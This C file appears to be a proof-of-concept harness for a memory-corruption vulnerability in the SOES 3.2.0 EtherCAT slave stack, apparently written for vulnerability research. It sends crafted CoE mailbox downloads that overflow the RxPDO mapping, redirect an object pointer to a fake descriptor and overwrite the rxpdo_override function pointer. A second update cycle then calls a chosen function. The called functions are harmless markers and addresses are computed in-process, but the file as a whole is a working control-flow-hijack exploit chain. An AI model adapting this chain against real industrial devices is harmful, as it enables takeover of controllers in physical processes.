/* SOES 3.2.0 CVE-2026-129811 — one real-consumer step past the chosen write.
 *
 * The committed coe_mailbox_overflow.c proves that crafted CoE mailbox
 * bytes drive the real sizeOfPDO()/RXPDO_update()/COE_pdoUnpack() into a
 * chosen-address write through the overwritten SMmap2[0].obj -> fake _objd.
 * This harness aims that same real write at a LIVE function-pointer slot:
 * ESCvar.rxpdo_override (esc.h:513, offset 112), which the real
 * RXPDO_update() calls indirectly at ecat_slv.c:166-168. A second
 * RXPDO_update() cycle then invokes the attacker-shaped pointer.
 *
 * Rung-4 mechanics only: the fake _objd address and the function address
 * are harness-computed (no leak), MBX[]/process bytes are seeded in-process,
 * there is no wire, HAL, live slave or command side effect. R5 NOT claimed.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

/* Real globals (MBX, MBXcontrol, ESCvar, SMmap2, rxpdo) and the real
 * ESC_download_pre/post_objecthandler from the pinned ecat_slv.c. */
#include "ecat_slv.c"

static uint16_t g_si;
static uint16_t g_map1, g_map2;
static uint8_t  g_ms0, g_ms1;
static uint32_t g_val0, g_val1;

static const char n_si[] = "si", n_map[] = "map", n_ms[] = "maxsub",
                 n_val[] = "mapping-value", n_unpack[] = "hook-target";

static const _objd od_1c12[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_si,  0, &g_si   },
   { 1, DTYPE_UNSIGNED16, 16, ATYPE_RWpre, n_map, 0, &g_map1 },
   { 2, DTYPE_UNSIGNED16, 16, ATYPE_RWpre, n_map, 0, &g_map2 },
};
static const _objd od_2000[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_ms,  0, &g_ms0  },
   { 1, DTYPE_UNSIGNED32, 32, ATYPE_RWpre, n_val, 0, &g_val0 },
};
static const _objd od_2001[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RWpre, n_ms,  0, &g_ms1  },
   { 1, DTYPE_UNSIGNED32, 32, ATYPE_RWpre, n_val, 0, &g_val1 },
};
static uint8_t g_legit_target[32];
static const _objd od_7000[] = {
   { 0, DTYPE_UNSIGNED8,  8, ATYPE_RO, n_ms, 1, NULL },
   { 1, DTYPE_UNSIGNED32, 128, ATYPE_RO, n_unpack, 0, g_legit_target },
};
const _objectlist SDOobjects[] = {
   { 0x1c12, OTYPE_ARRAY,  2, 0, n_si,  od_1c12 },
   { 0x2000, OTYPE_RECORD, 1, 0, n_val, od_2000 },
   { 0x2001, OTYPE_RECORD, 1, 0, n_val, od_2001 },
   { 0x7000, OTYPE_RECORD, 1, 0, n_unpack, od_7000 },
   { 0xFFFF, 0, 0, 0, NULL, NULL },
};

void ESC_write(uint16_t a, void *b, uint16_t l) { (void)a;(void)b;(void)l; }
void FOE_init(void) {}
void EOE_init(void) {}
void MBX_error(uint16_t err) { (void)err; }
uint8_t ESC_claimbuffer(void) { return 0; }

static uint8_t g_process[128];
static _objd g_fake_obj;
static volatile unsigned g_marker_hits;

/* Two distinct benign markers: varying the process byte changes which
 * function the overwritten hook actually calls. */
static void marker_a(void)
{
   g_marker_hits += 1;
   puts("MARKER_A: real RXPDO_update called the chosen rxpdo_override");
}
static void marker_b(void)
{
   g_marker_hits += 10;
   puts("MARKER_B: varied byte selected a different called function");
}

void ESC_read(uint16_t address, void *buf, uint16_t len)
{
   (void)address;
   if (len > sizeof(g_process)) len = sizeof(g_process);
   memcpy(buf, g_process, len);
}

static void deliver(void)
{
   _COEsdo *s = (_COEsdo *)&MBX[0];
   printf("deliver: idx=%04x sub=%u cmd=%02x len=%u\n",
          (unsigned)etohs(s->index), s->subindex, s->command,
          (unsigned)etohs(s->mbxheader.length));
   MBXcontrol[0].state = MBXstate_inclaim;
   ESCvar.xoe = 0;
   ESC_coeprocess();
}

static void build_download(uint16_t index, uint8_t subindex,
                           uint8_t command, uint32_t data)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = command;
   s->index = htoes(index);
   s->subindex = subindex;
   s->size = htoel(data);
}

static void build_complete_access(uint16_t index, const uint8_t *payload,
                                  uint32_t nbytes)
{
   memset(MBX, 0, sizeof(MBX));
   _COEsdo *s = (_COEsdo *)&MBX[0];
   s->mbxheader.length = htoes(COE_HEADERSIZE + 4 + nbytes);
   s->mbxheader.mbxtype = MBXCOE;
   s->coeheader.numberservice = htoes(COE_SDOREQUEST << 12);
   s->command = COE_COMMAND_DOWNLOADREQUEST | COE_COMPLETEACCESS;
   s->index = htoes(index);
   s->subindex = 0;
   s->size = htoel(nbytes);
   memcpy((uint8_t *)(&s->size) + 4, payload, nbytes);
}

static void reset(void)
{
   memset(&g_si, 0, sizeof(g_si));
   g_map1 = g_map2 = 0;
   g_ms0 = g_ms1 = 0;
   g_val0 = g_val1 = 0;
   memset(g_process, 0, sizeof(g_process));
   memset(&g_fake_obj, 0, sizeof(g_fake_obj));
   g_fake_obj.bitlength = 128;               /* memcpy path: 16 bytes */
   g_fake_obj.data = (void *)&ESCvar.rxpdo_override;  /* hook + next slot */
   memset(SMmap2, 0, sizeof(SMmap2));
   ESCvar.rxpdo_override = NULL;
   ESCvar.txpdo_override = NULL;
   ESCvar.sm2mappings = 0;
   ESCvar.ESC_SM2_sml = 0;
   ESCvar.MBXrun = 1;
   ESCvar.ALstatus = ESCpreop;
   memset(MBXcontrol, 0, sizeof(MBXcontrol));
   ESCvar.xoe = 0;
   g_marker_hits = 0;
}

int main(int argc, char **argv)
{
   int safe = (argc > 1 && strcmp(argv[1], "safe") == 0);
   int use_b = (argc > 1 && strcmp(argv[1], "b") == 0);
   void (*chosen)(void) = use_b ? marker_b : marker_a;
   int nmappings = 0;
   uint16_t size;
   uintptr_t a;
   int k;

   reset();

   if (safe)
   {
      const uint8_t payload[] = { 1, 0, 0x00, 0x20 };
      build_complete_access(0x1c12, payload, sizeof(payload));
   }
   else
   {
      const uint8_t payload[] = { 2, 0, 0x00, 0x20, 0x01, 0x20 };
      build_complete_access(0x1c12, payload, sizeof(payload));
   }
   deliver();

   build_download(0x2000, 0, 0x20 | 0x02 | 0x0C, 1);
   deliver();
   build_download(0x2000, 1, 0x20 | 0x02, 0x700001FFu);
   deliver();
   build_download(0x2001, 0, 0x20 | 0x02 | 0x0C, 1);
   deliver();
   build_download(0x2001, 1, 0x20 | 0x02, 0x700001FFu);
   deliver();

#ifdef SOES_FIXED_VERSION
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2,
                    MAX_RXPDO_SIZE);
#else
   size = sizeOfPDO(RX_PDO_OBJIDX, &nmappings, SMmap2, MAX_MAPPINGS_SM2);
#endif
   printf("sizeOfPDO=%u nmappings=%d MAX_RXPDO_SIZE=%d\n",
          (unsigned)size, nmappings, (int)MAX_RXPDO_SIZE);

   /* Process bytes sourced by the crafted ESC_read: map0 starts at offset 0.
    * 8 bytes of chosen function pointer, then 8 zero bytes so the adjacent
    * ESCvar.txpdo_override slot is set NULL and never called. */
   memcpy(g_process, &chosen, sizeof(chosen));
   memset(g_process + 8, 0, 8);
   a = (uintptr_t)&g_fake_obj;                /* harness-computed, no leak */
   for (k = 0; k < 8; k++) g_process[56 + k] = (uint8_t)(a >> (8 * k));

   ESCvar.ESC_SM2_sml = size;
   ESCvar.sm2mappings = nmappings;

   /* Cycle 1: real ESC_read overflow -> SMmap2[0].obj = fake ->
    * real COE_pdoUnpack memcpy writes the chosen pointer into ESCvar. */
   RXPDO_update();
   printf("after cycle1: obj=%p rxpdo_override=%p txpdo_override=%p hits=%u\n",
          (void *)SMmap2[0].obj, (void *)ESCvar.rxpdo_override,
          (void *)ESCvar.txpdo_override, (unsigned)g_marker_hits);

   /* Cycle 2: the same real RXPDO_update now takes the override branch and
    * calls the pointer the crafted bytes installed. */
   RXPDO_update();
   printf("after cycle2: hits=%u chosen=%p\n",
          (unsigned)g_marker_hits, (void *)chosen);
   printf("verdict: hook_written=%d indirect_call=%d marker_a=%d marker_b=%d\n",
          ESCvar.rxpdo_override == chosen,
          g_marker_hits != 0,
          g_marker_hits == 1,
          g_marker_hits == 10);
   return 0;
}
